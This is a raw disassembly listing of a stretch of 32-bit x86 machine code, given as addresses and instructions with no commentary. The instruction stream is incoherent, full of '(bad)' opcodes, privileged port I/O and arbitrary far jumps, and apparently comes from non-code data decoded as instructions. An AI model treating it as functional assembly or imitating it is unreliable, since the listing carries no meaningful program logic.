  4170ea:	loopne 0x417124
  4170ec:	sbb    bh,BYTE PTR [edx]
  4170ee:	push   ds
  4170ef:	jmp    0xc800:0xa29b75e4
  4170f6:	ds or  ah,cl
  4170f9:	inc    ecx
  4170fa:	in     eax,dx
  4170fb:	push   ebx
  4170fc:	daa    
  4170fd:	sub    BYTE PTR [edx+eax*1-0x74],dl
  417101:	sub    BYTE PTR ds:0x95f8ba2b,bl
  417107:	mov    ds:0x87ca643e,eax
  41710c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41710e:	nop
  41710f:	mov    bl,0x75
  417111:	(bad)  
  417112:	or     DWORD PTR [ebp+0x3b],ebp
  417115:	sti    
  417116:	stos   BYTE PTR es:[edi],al
  417117:	hlt    
  417118:	adc    al,0x6e
  41711a:	pop    edx
  41711b:	xor    edi,ebx
  41711d:	sbb    BYTE PTR fs:[esi],al
  417120:	sahf   
  417121:	sub    al,0xf7
  417123:	push   ss
  417124:	mov    WORD PTR ds:0x1208ca49,ds
  41712a:	inc    edx
  41712b:	xchg   edx,eax
  41712c:	sub    DWORD PTR [eax+0x5baec824],esi
  417132:	sub    BYTE PTR [edx-0x3841441e],bh
  417138:	and    eax,0x8060d033
  41713d:	inc    DWORD PTR [edi+0x4adba664]
  417143:	mov    ds:0xed184529,al
  417148:	and    al,0x2a
  41714a:	popa   
  41714b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41714c:	and    bl,BYTE PTR [ecx-0x49]
  41714f:	push   cs
  417150:	or     ecx,DWORD PTR [eax]
  417152:	in     eax,0xfc
  417154:	in     eax,dx
  417155:	bound  esp,QWORD PTR [ecx-0x18]
  417158:	aaa    
  417159:	shr    DWORD PTR [eax-0x31],0xba
  41715d:	sbb    ebx,DWORD PTR [esi]
  41715f:	jnp    0x4171da
  417161:	push   ebp
  417162:	(bad)  
  417163:	jl     0x417132
  417165:	sti    
  417166:	push   esp
  417167:	jl     0x41711d
  417169:	leave  
  41716a:	mov    edx,gs
  41716c:	rol    DWORD PTR [ecx],cl
  41716e:	xchg   esp,eax
  41716f:	dec    esi
  417170:	inc    edi
  417171:	sbb    edx,DWORD PTR [esi+edi*4+0x300f0ce2]
  417178:	push   ds
  417179:	ret    0xef5d
  41717c:	push   0xffffffeb
  41717e:	and    eax,0x45b5436
  417183:	mov    BYTE PTR [ecx],ah
  417185:	loope  0x417173
  417187:	mov    ah,0xc1
  417189:	stos   BYTE PTR es:[edi],al
  41718a:	push   ebp
  41718b:	fnstsw WORD PTR [eax]
  41718d:	adc    edi,DWORD PTR [ebx+esi*2-0x6fe60311]
  417194:	or     edx,ebp
  417196:	jmp    0xc44ff7e5
  41719b:	daa    
  41719c:	leave  
  41719d:	aad    0x8c
  41719f:	cld    
  4171a0:	mov    eax,0x7434a27c
  4171a5:	jo     0x4171d2
  4171a7:	adc    BYTE PTR [esp+edx*2],dh
  4171aa:	test   eax,0xdf6a26f3
  4171af:	rcl    DWORD PTR [ecx+0x5f079b7e],0xf8
  4171b6:	and    BYTE PTR ss:[edx+0x26619703],ch
  4171bd:	add    bl,cl
  4171bf:	bound  esi,QWORD PTR [ebx-0x6f94c499]
  4171c5:	jae    0x4171d4
  4171c7:	cs ret 
  4171c9:	mov    cl,0x65
  4171cb:	(bad)  
  4171cd:	jns    0x4171b4
  4171cf:	js     0x4171c4
  4171d1:	pop    eax
  4171d2:	scas   eax,DWORD PTR es:[edi]
  4171d3:	aaa    
  4171d4:	xchg   edx,eax
  4171d5:	mov    ah,0x1a
  4171d7:	fs shl BYTE PTR cs:[edx-0x383c7fa4],0x14
  4171e0:	aas    
  4171e1:	adc    al,0xf7
  4171e3:	jp     0x41720e
  4171e5:	jno    0x41722c
  4171e7:	and    edx,ecx
  4171e9:	icebp  
  4171ea:	dec    ecx
  4171eb:	out    dx,eax
  4171ec:	je     0x417221
  4171ee:	or     BYTE PTR [eax+0x6d],0x7f
  4171f2:	add    bl,BYTE PTR [ebp-0x23f85f2f]
  4171f8:	(bad)  
  4171f9:	pop    eax
  4171fa:	xchg   esp,eax
  4171fb:	adc    al,0x5d
  4171fd:	pop    ebx
  4171fe:	jmp    0x4171ca
  417200:	es retf 
  417202:	xchg   DWORD PTR [bp+di+0x31],ebp
  417206:	dec    esp
  417207:	xor    ecx,edi
  417209:	test   DWORD PTR [ecx+ebp*2],0x94db7a3e
  417210:	jge    0x41727a
  417212:	int3   
  417213:	jge    0x417240
  417215:	test   eax,0xa6704948
  41721a:	xchg   esp,eax
  41721b:	add    DWORD PTR [ebx-0x47cfa700],esp
  417221:	mov    ebp,0x6364ea8c
  417226:	inc    ebx
  417227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417228:	push   es
  417229:	fdivr  QWORD PTR [edx+0x22a4ac2f]
  41722f:	mov    edx,DWORD PTR [ecx]
  417231:	dec    edi
  417232:	sbb    al,BYTE PTR ds:0x4e231290
  417238:	add    DWORD PTR [esi],eax
  41723a:	add    BYTE PTR [eax],dh
  41723c:	push   0xffffffc9
  41723e:	mov    edx,0x1d7177e9
  417243:	sti    
  417244:	xchg   esi,eax
  417245:	dec    esp
  417246:	(bad)  
  417247:	push   ds
  417248:	xor    BYTE PTR [eax],dh
  41724a:	sub    edx,0xe81e046d
  417250:	fst    DWORD PTR [ebx+0x19fbdad7]
  417256:	outs   dx,BYTE PTR ds:[esi]
  417257:	add    eax,0x74d57f1a
  41725c:	mov    edi,DWORD PTR [eax]
  41725e:	adc    ebp,edx
  417260:	rol    BYTE PTR [edx+0x78],cl
  417263:	mov    edi,cs
  417265:	jae    0x4171fb
  417267:	ins    DWORD PTR es:[edi],dx
  417268:	mov    eax,ds:0x3002900e
  41726d:	test   eax,0x8c6b8b8d
  417272:	mov    edx,0xe13f7f0
  417277:	ins    DWORD PTR es:[edi],dx
  417278:	loope  0x417202
  41727a:	dec    esp
  41727b:	idiv   BYTE PTR [eax-0x5027448b]
  417281:	test   al,0x9a
  417283:	ret    
  417284:	je     0x4172a3
  417286:	mov    eax,ds:0xd4400ca
  41728b:	pop    eax
  41728c:	outs   dx,DWORD PTR ds:[esi]
  41728d:	or     al,0xd1
  41728f:	mov    ds:0x5c4588e3,eax
  417294:	iret   
  417295:	sbb    ecx,ebp
  417297:	or     esi,ecx
  417299:	in     eax,dx
  41729a:	mov    ebp,DWORD PTR [eax-0x6]
  41729d:	cmp    ah,bh
  41729f:	daa    
  4172a0:	mov    WORD PTR [ebx+0xd],fs
  4172a3:	add    ecx,eax
  4172a5:	(bad)  
  4172a6:	cmp    eax,0x493e232
  4172ab:	fstp   DWORD PTR [ecx-0x4657841c]
  4172b1:	addr16 (bad) 
  4172b3:	fld    QWORD PTR [edx+0xb]
  4172b6:	test   al,0x1a
  4172b8:	mov    edx,0x90af84a5
  4172bd:	push   esp
  4172be:	ficom  DWORD PTR [edi-0x449c5f45]
  4172c4:	cmp    BYTE PTR [eax+0x64276d1],ch
  4172ca:	dec    ebx
  4172cb:	mov    dl,0xc3
  4172cd:	in     al,dx
  4172ce:	pop    ebp
  4172cf:	je     0x417316
  4172d1:	add    BYTE PTR [eax],bh
  4172d3:	or     DWORD PTR [eax],ebp
  4172d5:	cmc    
  4172d6:	pop    es
  4172d7:	or     BYTE PTR [eax-0x77366194],al
  4172dd:	sub    BYTE PTR [ebp+0x24],ch
  4172e0:	jg     0x417270
  4172e2:	mov    edi,0x3e240c74
  4172e7:	scas   eax,DWORD PTR es:[edi]
  4172e8:	and    eax,0xdb548c6d
  4172ed:	sub    dl,BYTE PTR [ecx]
  4172ef:	mov    ebp,0x11499122
  4172f4:	jecxz  0x4172bc
  4172f6:	xchg   DWORD PTR [esi+0x64],ecx
  4172f9:	xor    bh,BYTE PTR [ecx-0xc80e45f]
  4172ff:	jmp    0x3895:0x1e87c463
  417306:	cdq    
  417307:	scas   eax,DWORD PTR es:[edi]
  417308:	mov    bh,0x87
  41730a:	std    
  41730b:	je     0x41731a
  41730d:	shl    BYTE PTR [eax],0xf7
  417310:	xor    ebx,0x76
  417313:	mov    esi,DWORD PTR [esi+0xd]
  417316:	push   eax
  417317:	inc    ebp
  417318:	inc    ebp
  417319:	pushf  
  41731a:	mov    DWORD PTR [eax-0x32],edx
  41731d:	div    BYTE PTR [ecx]
  41731f:	mov    WORD PTR [edi+0x5b],?
  417322:	xlat   BYTE PTR ds:[ebx]
  417323:	aas    
  417324:	arpl   WORD PTR [eax+0x7cd21a70],si
  41732a:	dec    ebx
  41732b:	or     DWORD PTR [ebp+0x33a279f3],esp
  417331:	mov    ecx,0x27241010
  417336:	std    
  417337:	shl    DWORD PTR [edx-0x72],1
  41733a:	push   cs
  41733b:	(bad)  
  41733c:	out    dx,al
  41733d:	(bad)  
  41733e:	fbld   TBYTE PTR [ecx+0x42]
  417341:	jmp    0xb02d:0xe5bc4761
  417348:	stos   DWORD PTR es:[edi],eax
  417349:	push   esp
  41734a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41734b:	bound  ebx,QWORD PTR [edx]
  41734d:	dec    edi
  41734e:	jmp    0x75fa0490
  417353:	cld    
  417354:	repnz add BYTE PTR [ebp+0xad3f9ad],bl
  41735b:	dec    esp
  41735c:	pop    ss
  41735d:	push   0xd51ff6a7
  417362:	xchg   ebp,eax
  417363:	xor    ah,BYTE PTR ds:0x19d29718
  417369:	and    DWORD PTR [edx+0x10],esi
  41736c:	test   al,0x5c
  41736e:	call   0x72c90cdb
  417373:	sbb    DWORD PTR [esp+ebp*1-0x73adc0a3],eax
  41737a:	mov    ?,WORD PTR [eax+0x268e7dc2]
  417380:	dec    ebx
  417381:	mov    dl,0x4a
  417383:	call   0x37c:0xfb320b82
  41738a:	pop    esi
  41738b:	xchg   esp,eax
  41738c:	jle    0x41738c
  41738e:	and    ecx,ebp
  417390:	dec    edi
  417391:	js     0x417342
  417393:	mov    WORD PTR [ecx+eax*8],es
  417396:	add    BYTE PTR [eax],dl
  417398:	push   ss
  417399:	add    DWORD PTR [esi-0xe],ebx
  41739c:	repz sbb eax,DWORD PTR [edi+ecx*1+0x42]
  4173a1:	nop
  4173a2:	fisubr DWORD PTR [esi+0x39585764]
  4173a8:	ret    
  4173a9:	mov    edx,0xb7670d8c
  4173ae:	push   ebx
  4173af:	adc    ch,BYTE PTR [ebx-0x31]
  4173b2:	fucom  st(0)
  4173b4:	jp     0x4173ba
  4173b6:	jcxz   0x417438
  4173b9:	jp     0x417419
  4173bb:	and    eax,0xdc7e41c
  4173c0:	shl    BYTE PTR [ebx],cl
  4173c2:	push   edi
  4173c3:	pusha  
  4173c4:	out    dx,eax
  4173c5:	xor    cl,BYTE PTR [ebp+0x3c]
  4173c8:	pop    ss
  4173c9:	jl     0x4173c3
  4173cb:	jle    0x417370
  4173cd:	ins    DWORD PTR es:[edi],dx
  4173ce:	dec    ebp
  4173cf:	pop    esp
  4173d0:	and    al,0x3
  4173d2:	nop
  4173d3:	and    dl,BYTE PTR [ebp-0x7b]
  4173d6:	xlat   BYTE PTR ds:[ebx]
  4173d7:	lock loopne 0x4173a5
  4173da:	push   esp
  4173db:	cs push 0xffffffcc
  4173de:	jae    0x41742e
  4173e0:	mov    ebp,0xd926b321
  4173e5:	xchg   esi,eax
  4173e6:	xor    al,0xa4
  4173e8:	push   es
  4173e9:	and    DWORD PTR [ebp+ecx*4+0xf],eax
  4173ed:	mov    bh,BYTE PTR [ecx+0x595fe005]
  4173f3:	cwde   
  4173f4:	add    DWORD PTR [edi+0x1230da2c],ebx
  4173fa:	les    ebp,FWORD PTR [ecx+0x4efeba98]
  417400:	push   edx
  417401:	mov    esi,0xda724b9
  417406:	or     BYTE PTR [esi-0x61],bl
  417409:	jno    0x4173af
  41740b:	ja     0x4173ea
  41740d:	out    0x21,al
  41740f:	cmc    
  417410:	mov    edx,0x9367400d
  417415:	inc    eax
  417416:	rol    BYTE PTR [ebx],cl
  417418:	ss mov dl,ah
  41741b:	enter  0x76d7,0xfa
  41741f:	out    dx,eax
  417420:	sub    esi,DWORD PTR [ecx]
  417422:	mov    ebx,0x57e33f56
  417427:	dec    edx
  417428:	icebp  
  417429:	test   al,0x9d
  41742b:	arpl   WORD PTR [ecx-0x141f0f7c],bx
  417431:	jne    0x4173d2
  417433:	in     eax,0x44
  417435:	dec    esp
  417436:	ret    0x51ee
  417439:	and    DWORD PTR [edi-0x6c],esp
  41743c:	fcom   QWORD PTR [ebx]
  41743e:	cvttps2pi mm2,QWORD PTR [edi-0x7c]
  417442:	cmc    
  417443:	jns    0x4173eb
  417445:	xlat   BYTE PTR ds:[ebx]
  417446:	push   0x60
  417448:	je     0x417474
  41744a:	xchg   esi,eax
  41744b:	fst    DWORD PTR [edi-0x337a17bd]
  417451:	sbb    BYTE PTR [ebx-0x78],bl
  417454:	xchg   edi,eax
  417455:	das    
  417456:	jnp    0x41744d
  417458:	or     edx,edx
  41745a:	pop    edx
  41745b:	fcom   st(4)
  41745d:	outs   dx,BYTE PTR ds:[esi]
  41745e:	retf   
  41745f:	jmp    0x417429
  417461:	or     eax,0x1da9a12e
  417466:	les    ebp,FWORD PTR [edx+0x40]
  417469:	cmc    
  41746a:	mov    al,0xf8
  41746c:	out    dx,al
  41746d:	sub    esp,DWORD PTR [edx+0x59]
  417470:	(bad)  
  417471:	cmp    eax,DWORD PTR [ebx-0x63]
  417474:	lock repz mov esi,0x991f75cd
  41747b:	sub    eax,esp
  41747d:	fwait
  41747e:	push   0xffffff8f
  417480:	mov    bh,0xeb
  417482:	inc    ebp
  417483:	mov    dl,0xfd
  417485:	sahf   
  417486:	pop    esp
  417487:	mov    al,ds:0x53dcd3d2
  41748c:	mov    ?,WORD PTR [ebx-0x5f]
  41748f:	sbb    BYTE PTR [edx+eiz*1-0x5d18df4],ch
  417496:	xchg   bh,bl
  417498:	gs pop esp
  41749a:	je     0x41747d
  41749c:	inc    edi
  41749d:	add    BYTE PTR [eax+0x2869c532],bh
  4174a3:	mov    ah,0xd0
  4174a5:	jmp    0x4565:0x163350d2
  4174ac:	xchg   ebx,eax
  4174ad:	xor    BYTE PTR ds:0x7b59545c,dh
  4174b3:	cs jnp 0x4174f4
  4174b6:	ins    BYTE PTR es:[edi],dx
  4174b7:	fisttp WORD PTR [ecx+0x4343d644]
  4174bd:	adc    BYTE PTR [edx+edx*1],dl
  4174c0:	in     eax,dx
  4174c1:	cmp    ebx,eax
  4174c3:	push   esp
  4174c4:	dec    edi
  4174c5:	fisttp DWORD PTR [ebp+0x240c59b0]
  4174cb:	add    esi,DWORD PTR [ebp-0x25]
  4174ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174cf:	retf   0x6e2c
  4174d2:	outs   dx,DWORD PTR ds:[esi]
  4174d3:	rol    DWORD PTR [edx+0x9],0x26
  4174d7:	and    bl,bh
  4174d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174da:	call   0xc182:0xdeb12073
  4174e1:	sbb    al,0x2e
  4174e3:	pop    edx
  4174e4:	and    BYTE PTR [eax],0x9f
  4174e7:	or     BYTE PTR [ebp+edx*8+0x15],bh
  4174eb:	lea    eax,[edi]
  4174ed:	dec    edi
  4174ee:	imul   ebp,esi,0x74
  4174f1:	fdivr  st(4),st
  4174f3:	xor    ebx,DWORD PTR ds:0xcde9d325
  4174f9:	sbb    esp,DWORD PTR [eax-0x23]
  4174fc:	push   0x66
  4174fe:	call   0x4dc2084
  417503:	lods   al,BYTE PTR ds:[esi]
  417504:	cmp    esp,esi
  417506:	cmp    eax,0xf4358d04
  41750b:	mov    ah,0x6d
  41750d:	dec    ebp
  41750e:	test   DWORD PTR [edi],ebp
  417510:	in     eax,0x90
  417512:	out    0x7a,al
  417514:	and    al,BYTE PTR [edx+0x13631a3f]
  41751a:	dec    esi
  41751b:	sar    ecx,cl
  41751d:	sbb    BYTE PTR [esi+0x75],dl
  417520:	js     0x417515
  417522:	cmp    DWORD PTR [edx+0x7a3e251],esp
  417528:	xor    al,0x8d
  41752a:	aaa    
  41752b:	mov    ebx,0xc069a650
  417530:	inc    ecx
  417531:	lods   al,BYTE PTR ds:[esi]
  417532:	pop    eax
  417533:	outs   dx,BYTE PTR ds:[esi]
  417534:	iret   
  417535:	or     al,0xb2
  417537:	aad    0xef
  417539:	hlt    
  41753a:	ror    DWORD PTR [edx+0x73a7a193],1
  417540:	es cmp edi,esp
  417543:	jge    0x41750d
  417545:	xor    dl,BYTE PTR [ecx+eax*2-0x4c5653ca]
  41754c:	call   0xa2a0:0x9483171c
  417553:	popf   
  417554:	ins    DWORD PTR es:[edi],dx
  417555:	rcl    DWORD PTR [esi-0x7],1
  417558:	and    dh,BYTE PTR [eax]
  41755a:	jne    0x417584
  41755c:	mov    ds:0x3b175087,al
  417561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417562:	or     DWORD PTR [edi+ecx*1+0x35],esi
  417566:	jg     0x41755e
  417568:	out    0x6f,eax
  41756a:	xchg   ecx,eax
  41756b:	ret    
  41756c:	inc    esp
  41756d:	dec    eax
  41756e:	inc    esp
  41756f:	and    BYTE PTR [ebp+0x1c0756],dl
  417575:	mov    al,0x9f
  417577:	pop    ebp
  417578:	mov    WORD PTR ds:0xe7cce6,?
  41757e:	ret    0x6ce3
  417581:	pop    ecx
  417582:	or     DWORD PTR [ebx+edx*2-0x1c],ebx
  417586:	jmp    0xcf6d:0xb19536b8
  41758d:	push   ecx
  41758e:	fldcw  WORD PTR [ecx-0x3502d]
  417594:	out    dx,eax
  417595:	ins    BYTE PTR es:[edi],dx
  417596:	test   BYTE PTR [ebx+0x71003268],0x85
  41759d:	cmp    ecx,DWORD PTR [esi]
  41759f:	out    0x54,eax
  4175a1:	mov    ah,0x23
  4175a3:	test   al,0x34
  4175a5:	mov    WORD PTR [edx+0xb],cs
  4175a8:	add    BYTE PTR [esi-0x6d5f67d0],ah
  4175ae:	and    al,0xd7
  4175b0:	jbe    0x417620
  4175b2:	mov    esi,0x1501533d
  4175b7:	daa    
  4175b8:	dec    BYTE PTR [edx+0x2a]
  4175bb:	stc    
  4175bc:	pop    eax
  4175bd:	sbb    al,0x57
  4175bf:	test   al,0x1e
  4175c1:	push   cs
  4175c2:	sbb    eax,0x243c2a7a
  4175c7:	fwait
  4175c8:	pop    ebp
  4175c9:	add    esi,ebp
  4175cb:	mov    gs,WORD PTR [ebx]
  4175cd:	cli    
  4175ce:	rcr    DWORD PTR [ecx-0x5b],1
  4175d1:	mov    cl,0x2d
  4175d3:	or     bh,dl
  4175d5:	mov    cl,dl
  4175d7:	scas   al,BYTE PTR es:[edi]
  4175d8:	and    al,0xb1
  4175da:	mov    esi,0xc50540d
  4175df:	xor    esp,DWORD PTR [esi-0x19c7a2d1]
  4175e5:	push   edi
  4175e6:	fcomp  QWORD PTR [eax]
  4175e8:	sub    ecx,ebx
  4175ea:	sub    BYTE PTR [edx*1+0x400ec74c],0x78
  4175f2:	push   eax
  4175f3:	cmp    ebp,DWORD PTR [edi-0x68]
  4175f6:	arpl   WORD PTR ds:0x598bbadb,bp
  4175fc:	or     DWORD PTR [ecx],ecx
  4175fe:	jg     0x4175e7
  417600:	xchg   esp,eax
  417601:	scas   eax,DWORD PTR es:[edi]
  417602:	add    DWORD PTR [ecx-0x10],0x6d
  417606:	cmp    dh,0xcf
  417609:	cmp    eax,0xf66924cd
  41760e:	test   DWORD PTR [eax+0x65],esi
  417611:	mov    edi,DWORD PTR [esi]
  417613:	js     0x417619
  417615:	shl    ebx,0x16
  417618:	sub    DWORD PTR [ebp+0x70d44b1],eax
  41761e:	lock or al,0x15
  417621:	js     0x41765b
  417623:	adc    DWORD PTR [ebx+0x870a493],esi
  417629:	aaa    
  41762a:	imul   edi,DWORD PTR [eax-0x4c562c9b],0xd671a21e
  417634:	daa    
  417635:	xchg   edx,eax
  417636:	les    edx,FWORD PTR [eax-0x195b53b2]
  41763c:	shl    DWORD PTR [esi],0xcc
  41763f:	jge    0x417626
  417641:	add    DWORD PTR [eax],ecx
  417643:	push   ebx
  417644:	sub    edx,DWORD PTR es:[esi+0x1c]
  417648:	ja     0x4175ce
  41764a:	xor    esp,esi
  41764c:	pop    esp
  41764d:	add    BYTE PTR [ecx-0x24],ah
  417650:	cdq    
  417651:	mov    edi,0x542e1cbb
  417656:	and    ebx,esi
  417658:	lahf   
  417659:	push   edi
  41765a:	mov    edi,0x2a51849d
  41765f:	or     DWORD PTR [ebp-0x4d],edi
  417662:	popa   
  417663:	iret   
  417664:	xchg   BYTE PTR [ecx-0x26828042],dh
  41766a:	jbe    0x417618
  41766c:	pop    ebx
  41766d:	rol    DWORD PTR [esi+0x43d71603],cl
  417673:	mov    BYTE PTR [ebx+eax*8],cl
  417676:	cs jg  0x417687
  417679:	and    ebx,ebx
  41767b:	mov    ds:0xeae7ada4,eax
  417680:	lods   eax,DWORD PTR ds:[esi]
  417681:	les    esp,FWORD PTR [edi-0x6db341a2]
  417687:	(bad)  
  417688:	xor    ah,bl
  41768a:	push   eax
  41768b:	jo     0x417639
  41768d:	push   ebp
  41768e:	xor    eax,0xb7aa2573
  417693:	mov    eax,0x4dad24b4
  417698:	dec    ebp
  417699:	push   ecx
  41769a:	aam    0xd
  41769c:	jmp    0x4176d1
  41769e:	pop    ebx
  41769f:	(bad)  
  4176a0:	rcr    DWORD PTR [eax],cl
  4176a2:	cmp    BYTE PTR [eax],ch
  4176a4:	mov    edx,0x47e5bf26
  4176a9:	adc    ebp,DWORD PTR [eax]
  4176ab:	pusha  
  4176ac:	data16 cld 
  4176ae:	and    al,0x50
  4176b0:	div    BYTE PTR [ecx-0x5]
  4176b3:	push   0x31
  4176b5:	jns    0x41764d
  4176b7:	push   ebp
  4176b8:	adc    eax,esp
  4176ba:	fwait
  4176bb:	jae    0x41764d
  4176bd:	xor    eax,0x94361c09
  4176c2:	loope  0x4176e4
  4176c4:	je     0x4176bc
  4176c6:	jb     0x4176ae
  4176c8:	clc    
  4176c9:	lahf   
  4176ca:	or     eax,esp
  4176cc:	pusha  
  4176cd:	add    bh,BYTE PTR [ebp+ebx*8-0x7c2febdc]
  4176d4:	inc    eax
  4176d5:	mov    ebx,0x8fc0442d
  4176da:	loope  0x417689
  4176dc:	in     al,dx
  4176dd:	pop    ss
  4176de:	cmp    BYTE PTR [edi],dl
  4176e0:	int    0x59
  4176e2:	push   ebp
  4176e3:	push   edx
  4176e4:	sub    eax,0x43839bab
  4176e9:	out    dx,eax
  4176ea:	sbb    ch,al
  4176ec:	xchg   edx,eax
  4176ed:	arpl   WORD PTR [edx+ebp*2-0x1c],bx
  4176f1:	or     eax,0x5eb87bd0
  4176f6:	mov    cl,0x26
  4176f8:	in     al,0x70
  4176fa:	and    eax,0xed5b27f3
  4176ff:	fwait
  417700:	cdq    
  417701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417702:	dec    esi
  417703:	xchg   ebx,eax
  417704:	(bad)  
  417705:	iret   
  417706:	mov    ebx,edi
  417708:	fsub   QWORD PTR [esi+0x74]
  41770b:	imul   ebx,esp,0x8cb684e3
  417711:	enter  0x1814,0x8c
  417715:	xchg   edi,eax
  417716:	test   eax,0xe2ac47b6
  41771b:	xor    al,0x73
  41771d:	mov    ebx,es
  41771f:	sub    ah,BYTE PTR [ecx+ecx*2-0x4215f69f]
  417726:	nop
  417727:	mov    al,ch
  417729:	jmp    0x417785
  41772b:	mov    bl,0x51
  41772d:	jmp    0x417723
  41772f:	imul   esi,DWORD PTR [edx],0x6cf1e047
  417735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417736:	mov    ds:0x3d414651,eax
  41773b:	cmp    al,0x90
  41773d:	or     al,0xa8
  41773f:	sbb    al,0xe0
  417741:	clc    
  417742:	test   DWORD PTR [edx-0x127f2e83],ebp
  417748:	jmp    ebp
  41774a:	dec    esi
  41774b:	ret    
  41774c:	jecxz  0x4177c5
  41774e:	popa   
  41774f:	or     al,0x13
  417751:	add    al,0x61
  417753:	(bad)  
  417754:	fistp  QWORD PTR [edx-0x3f]
  417757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417758:	mov    dl,0xfe
  41775a:	(bad)  
  41775b:	int3   
  41775c:	lahf   
  41775d:	xchg   ecx,eax
  41775e:	ret    
  41775f:	jle    0x417743
  417761:	or     al,0xf2
  417763:	sbb    BYTE PTR [ebp-0x59],bh
  417766:	inc    ebp
  417767:	fmulp  st(7),st
  417769:	xor    esp,DWORD PTR [ebx+0x70da1a5d]
  41776f:	stos   BYTE PTR es:[edi],al
  417770:	test   eax,0xa7cf4126
  417775:	sub    cl,bl
  417777:	aad    0x53
  417779:	adc    al,0x64
  41777b:	push   esi
  41777c:	jae    0x41772f
  41777e:	mov    esi,0x89d95839
  417783:	cs lock iret 
  417786:	scas   al,BYTE PTR es:[edi]
  417787:	dec    ebp
  417788:	cli    
  417789:	push   eax
  41778a:	scas   eax,DWORD PTR es:[edi]
  41778b:	inc    esp
  41778c:	fild   QWORD PTR [edi-0xa]
  41778f:	popa   
  417790:	pop    ecx
  417791:	push   ebp
  417792:	and    eax,0x89ac505f
  417797:	in     al,0x11
  417799:	ror    ebp,0x7
  41779c:	lds    ebp,FWORD PTR [esi+0x529ffacd]
  4177a2:	dec    edx
  4177a3:	rcl    BYTE PTR [ebp-0x54135891],1
  4177a9:	loopne 0x4177e6
  4177ab:	adc    DWORD PTR [esi],edx
  4177ad:	enter  0x9b6,0x4c
  4177b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177b2:	popa   
  4177b3:	(bad)  
  4177b4:	fild   DWORD PTR [edx-0x42e78799]
  4177ba:	aad    0xb3
  4177bc:	iret   
  4177bd:	or     al,0xb
  4177bf:	cdq    
  4177c0:	jmp    0x2614:0xd6aef294
  4177c7:	mov    WORD PTR [esi-0x522d5816],cs
  4177cd:	sbb    eax,edi
  4177cf:	dec    esi
  4177d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177d1:	mov    ebx,0x84c98ee1
  4177d6:	mov    dh,0xd5
  4177d8:	xchg   edi,eax
  4177d9:	push   ecx
  4177da:	jno    0x4177a4
  4177dc:	repz dec ebx
  4177de:	mov    es,eax
  4177e0:	cs and eax,0x3025ebc2
  4177e6:	mov    ebx,0x3036fd
  4177eb:	icebp  
  4177ec:	dec    edi
  4177ed:	or     edx,DWORD PTR [edx+0x365efece]
  4177f3:	lods   eax,DWORD PTR ds:[esi]
  4177f4:	bound  esp,QWORD PTR [edi-0x4c7d9c79]
  4177fa:	adc    edi,DWORD PTR [eax]
  4177fc:	sbb    eax,0xc07b7029
  417801:	and    DWORD PTR [edi],edx
  417803:	mov    ?,WORD PTR [edx-0x5d1b0b14]
  417809:	in     eax,dx
  41780a:	aaa    
  41780b:	aad    0x35
  41780d:	push   edi
  41780e:	clc    
  41780f:	icebp  
  417810:	in     eax,0x52
  417812:	and    al,0x49
  417814:	fbstp  TBYTE PTR [ecx-0x11280650]
  41781a:	or     dh,BYTE PTR [ebp+0x7c5207a]
  417820:	pop    ss
  417821:	mov    ebx,0x28b4cf45
  417826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417827:	xchg   ecx,eax
  417828:	cwde   
  417829:	fisub  DWORD PTR [ecx-0xee0702b]
  41782f:	lock xchg edi,eax
  417831:	test   al,0x62
  417833:	dec    esp
  417834:	pop    ds
  417835:	and    cl,bh
  417837:	mov    dh,0x89
  417839:	jae    0x4178ab
  41783b:	jmp    0x9ab39751
  417840:	mov    bh,0x44
  417842:	cmp    BYTE PTR [edx-0x219033f],0xa8
  417849:	int3   
  41784a:	pushf  
  41784b:	or     ecx,DWORD PTR [ebp+0x20d54a1]
  417851:	je     0x417820
  417853:	(bad)  
  417854:	jmp    0xa7c4:0xbb39cbc7
  41785b:	stos   DWORD PTR es:[edi],eax
  41785c:	out    0x4f,eax
  41785e:	inc    esp
  41785f:	aad    0xfd
  417861:	test   BYTE PTR [ebx+0x374d2ae0],dl
  417867:	sub    al,0xa0
  417869:	jl     0x417894
  41786b:	mov    al,ds:0x8f7ef74c
  417870:	cwde   
  417871:	out    0x19,al
  417873:	daa    
  417874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417875:	add    BYTE PTR [edx],0x92
  417878:	(bad)  
  417879:	call   0xb174:0x75a8b47e
  417880:	sub    ebp,DWORD PTR ds:[ecx]
  417883:	cmp    al,0xb5
  417885:	fmul   st,st(7)
  417887:	test   eax,0x2fb586b8
  41788c:	lds    esp,FWORD PTR [edi+eiz*1-0x760b37dc]
  417893:	loope  0x417843
  417895:	add    al,0x50
  417897:	mov    eax,ds:0x8660338
  41789c:	pop    eax
  41789d:	jecxz  0x41789a
  41789f:	adc    al,0x3d
  4178a1:	ja     0x41787d
  4178a3:	sub    al,0xc3
  4178a5:	jmp    0xeb194b3b
  4178aa:	pop    ecx
  4178ab:	inc    edi
  4178ac:	cmp    al,0xf9
  4178ae:	aam    0x1a
  4178b0:	or     esp,DWORD PTR [edi]
  4178b2:	shl    BYTE PTR [eax-0x57586ed9],cl
  4178b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178b9:	pushf  
  4178ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178bb:	(bad)  
  4178bc:	loopne 0x41793a
  4178be:	sbb    esi,ebp
  4178c0:	(bad)  
  4178c1:	ror    BYTE PTR [eax-0x33],cl
  4178c4:	xor    bh,BYTE PTR [ebx-0x49]
  4178c7:	mov    ebx,0xa9b07bd4
  4178cc:	and    ah,BYTE PTR [edi+0x4]
  4178cf:	fcmovnb st,st(3)
  4178d1:	pop    ds
  4178d2:	dec    ebx
  4178d3:	adc    DWORD PTR [edx],edx
